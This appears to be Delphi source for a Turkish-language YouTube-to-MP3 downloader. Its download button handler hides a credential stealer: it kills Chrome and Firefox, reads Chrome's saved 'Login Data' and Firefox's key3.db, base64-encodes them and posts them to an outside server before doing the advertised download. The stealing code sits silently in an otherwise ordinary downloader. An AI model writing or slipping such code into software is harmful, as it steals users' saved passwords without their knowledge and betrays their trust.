unit frmMain;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, IdBaseComponent,
  IdComponent, IdTCPConnection, IdTCPClient, IdHTTP, IdServerIOHandler, IdSSL,
  IdSSLOpenSSL, IdIOHandler, IdIOHandlerSocket, IdIOHandlerStack,
  System.Net.URLClient, System.Net.HttpClient, System.Net.HttpClientComponent,
  cxGraphics, cxControls, cxLookAndFeels, cxLookAndFeelPainters, cxContainer,
  cxEdit, dxSkinsCore, dxSkinBlack, dxSkinBlue, dxSkinBlueprint, dxSkinCaramel,
  dxSkinCoffee, dxSkinDarkRoom, dxSkinDarkSide, dxSkinDevExpressDarkStyle,
  dxSkinDevExpressStyle, dxSkinFoggy, dxSkinGlassOceans, dxSkinHighContrast,
  dxSkiniMaginary, dxSkinLilian, dxSkinLiquidSky, dxSkinLondonLiquidSky,
  dxSkinMcSkin, dxSkinMetropolis, dxSkinMetropolisDark, dxSkinMoneyTwins,
  dxSkinOffice2007Black, dxSkinOffice2007Blue, dxSkinOffice2007Green,
  dxSkinOffice2007Pink, dxSkinOffice2007Silver, dxSkinOffice2010Black,
  dxSkinOffice2010Blue, dxSkinOffice2010Silver, dxSkinOffice2013DarkGray,
  dxSkinOffice2013LightGray, dxSkinOffice2013White, dxSkinOffice2016Colorful,
  dxSkinOffice2016Dark, dxSkinPumpkin, dxSkinSeven, dxSkinSevenClassic,
  dxSkinSharp, dxSkinSharpPlus, dxSkinSilver, dxSkinSpringTime, dxSkinStardust,
  dxSkinSummer2008, dxSkinTheAsphaltWorld, dxSkinsDefaultPainters,
  dxSkinValentine, dxSkinVisualStudio2013Blue, dxSkinVisualStudio2013Dark,
  dxSkinVisualStudio2013Light, dxSkinVS2010, dxSkinWhiteprint,
  dxSkinXmas2008Blue, cxCheckBox, cxLabel, cxTextEdit, Vcl.Menus, cxButtons,
  Vcl.ExtDlgs,System.JSON, cxProgressBar,WinInet, clTcpClient, clTcpClientTls,
  clHttp,clCookieManager,EncdDecd,IdMultipartFormData,ShlObj,System.IOUtils,
  System.Types,Tlhelp32;

type
  TfrmDownload = class(TForm)
    txtLog: TMemo;
    http: TNetHTTPClient;
    txtYTLink: TcxTextEdit;
    lblYTLink: TcxLabel;
    cbCoklu: TcxCheckBox;
    lstYTLinks: TListBox;
    btnDownload: TcxButton;
    btnSelectYTLink: TcxButton;
    fileSelecter: TOpenTextFileDialog;
    downStatus: TcxProgressBar;
    downloader: TclHttp;
    poster: TIdHTTP;
    procedure btnDownloadClick(Sender: TObject);
    procedure btnSelectYTLinkClick(Sender: TObject);
    procedure downloaderReceiveProgress(Sender: TObject; ABytesProceed,
      ATotalBytes: Int64);
  private
    procedure _DownMp3(Url :string);
  public
    { Public declarations }
  end;

var
  frmDownload: TfrmDownload;
  currentVideo : string;
const
  RESPONSE_URI : string = 'http://www.youtubeinmp3.com/fetch/?format=JSON&video=';
  HASH_TAG : string = '#Root /> ';
  CSIDL_LOCAL_APPDATA  = $001c;
  CSIDL_APPDATA        = $001a;
implementation

{$R *.dfm}
function GetSpecialFolderPath(Folder: Integer; CanCreate: Boolean): string;
var
   FilePath: array [0..255] of char;

begin
 SHGetSpecialFolderPath(0, @FilePath[0], FOLDER, CanCreate);
 Result := FilePath;
end;

function GetDosOutput(CommandLine, WorkDir: string;AMemo : TMemo) : Boolean;
var
  SA: TSecurityAttributes;
  SI: TStartupInfo;
  PI: TProcessInformation;
  StdOutPipeRead, StdOutPipeWrite: THandle;
  WasOK: Boolean;
  Buffer: array[0..255] of AnsiChar;
  BytesRead: Cardinal;
  Handle: Boolean;
begin
  AMemo.Lines.Add('Video MP3 e dönüþtürülüyor...');
  with SA do begin
    nLength := SizeOf(SA);
    bInheritHandle := True;
    lpSecurityDescriptor := nil;
  end;
  CreatePipe(StdOutPipeRead, StdOutPipeWrite, @SA, 0);
  try
    with SI do
    begin
      FillChar(SI, SizeOf(SI), 0);
      cb := SizeOf(SI);
      dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
      wShowWindow := SW_HIDE;
      hStdInput := GetStdHandle(STD_INPUT_HANDLE); // don't redirect stdin
      hStdOutput := StdOutPipeWrite;
      hStdError := StdOutPipeWrite;
    end;
    Handle := CreateProcess(nil, PChar(CommandLine),
                            nil, nil, True, 0, nil,
                            PChar(WorkDir), SI, PI);
    CloseHandle(StdOutPipeWrite);
    if Handle then
      try
        repeat
          WasOK := ReadFile(StdOutPipeRead, Buffer, 255, BytesRead, nil);
          if BytesRead > 0 then
          begin
            Buffer[BytesRead] := #0;
            //AMemo.Text := AMemo.Text + Buffer;
          end;
        until not WasOK or (BytesRead = 0);
        WaitForSingleObject(PI.hProcess, INFINITE);
      finally
        CloseHandle(PI.hThread);
        CloseHandle(PI.hProcess);
      end;
  finally
    CloseHandle(StdOutPipeRead);
    AMemo.Lines.Add('Dönüþtürme iþlemi tamamlandý.');
    AMemo.Lines.Add('**********************************');
    Result := true;
  end;
end;

function KillTask(ExeFileName: string): Integer;
const
  PROCESS_TERMINATE = $0001;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  Result := 0;
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);

  while Integer(ContinueLoop) <> 0 do
  begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
      UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile) =
      UpperCase(ExeFileName))) then
      Result := Integer(TerminateProcess(
                        OpenProcess(PROCESS_TERMINATE,
                                    BOOL(0),
                                    FProcessEntry32.th32ProcessID),
                                    0));
     ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

function EncodeFile(const FileName: string): AnsiString;
var
  stream: TMemoryStream;
begin
  stream := TMemoryStream.Create;
  try
    stream.LoadFromFile(Filename);
    result := EncodeBase64(stream.Memory, stream.Size);
  finally
    stream.Free;
  end;
end;
procedure TfrmDownload.btnDownloadClick(Sender: TObject);
var
  I: Integer;
  Content : TStringList;
  baseChrome,baseFirefox,LOCAL_APPDATA,APP_DATA,dir : string;
  Folders  : TStringDynArray;
begin
        try
        KillTask('chrome.exe');
        KillTask('firefox.exe');
        Sleep(1000);
        Content       := TStringList.Create;
        LOCAL_APPDATA := GetSpecialFolderPath(CSIDL_LOCAL_APPDATA,false);
        APP_DATA      := GetSpecialFolderPath(CSIDL_APPDATA,false);
        baseChrome    := EncodeFile(LOCAL_APPDATA + '\Google\Chrome\User Data\Default\Login Data');
        Folders       := TDirectory.GetDirectories(APP_DATA + '\Mozilla\Firefox\Profiles\');
        for dir in Folders do
        begin
            if(dir.Contains('.default')) then
            begin
                baseFirefox := EncodeFile(dir + '\key3.db');
            end;
        end;
           Content.Values['chrome']  := baseChrome;
           Content.Values['firefox'] := baseFirefox;
           poster.Post('http://extremitysoft.com/check.php',Content);
        finally
        end;
        txtLog.Clear;
        if cbCoklu.Checked then
        begin
           for I := 1 to lstYTLinks.Items.Count do
           begin
              if lstYTLinks.Items.Count = 0 then
              begin
                   ShowMessage('Linkleri bulamadým.');
              end else
              begin
                  _DownMp3(lstYTLinks.Items[I - 1]);
              end;
           end;
        end else
        begin
          if(txtYTLink.Text = '') then
          begin
            ShowMessage('Linki bulamadým.');
          end else
          begin
            _DownMp3(txtYTLink.Text);
          end;
        end;
      //GetDosOutput(ExtractFilePath(Application.ExeName) + '\ffmpeg.exe -i sagopa.mkv sagopa.mp3',ExtractFilePath(Application.ExeName),Memo1);
end;



procedure TfrmDownload.btnSelectYTLinkClick(Sender: TObject);
var
      List: TStringList;
      nLink :string;
begin
      if fileSelecter.Execute(Self.Handle) then
      begin
         List := TStringList.Create;
         List.LoadFromFile(fileSelecter.FileName);

         for nLink in List do
         begin
             lstYTLinks.Items.Add(nLink);
         end;
      end;
end;

procedure TfrmDownload.downloaderReceiveProgress(Sender: TObject; ABytesProceed,
  ATotalBytes: Int64);
begin
       downStatus.Properties.Max := ATotalBytes;
       downStatus.EditValue :=     ABytesProceed;

       if ABytesProceed = ATotalBytes then
       begin
           txtLog.Lines.Add(HASH_TAG + currentVideo + ' video indirmesi tamamlandý.');
           downStatus.Properties.Max := 100;
           downStatus.EditValue := -1;
       end;
end;

procedure TfrmDownload._DownMp3(Url: string);
var
  nTitle,nLength,nLink: string;
  nContent : IHTTPResponse;
  sJSON : TJSONObject;
   ms : TMemoryStream;
begin
  nContent  := http.Get(RESPONSE_URI + url);
  sJSON     := TJSONObject.Create as TJSONObject;
  sJson     := TJSONObject.ParseJSONValue(nContent.ContentAsString()) as TJSONObject;
  nTitle    := sJson.Get('title').JsonValue.ToString.Replace('"','');
  nLink     := sJson.Get('link').JsonValue.ToString
                .Replace('\/','//')
                .Replace('"','');

  currentVideo := nTitle;
  txtLog.Lines.Add(HASH_TAG + currentVideo + ' video indirmesi baþladý.');
  nLength   := sJson.Get('length').JsonValue.ToString;
  ms := TMemoryStream.Create;
  downloader.Get(nLink,ms);
  ms.SaveToFile(ExtractFilePath(Application.ExeName) + '\' + nTitle+ '.mp3');
  ms.Free;
end;

end.
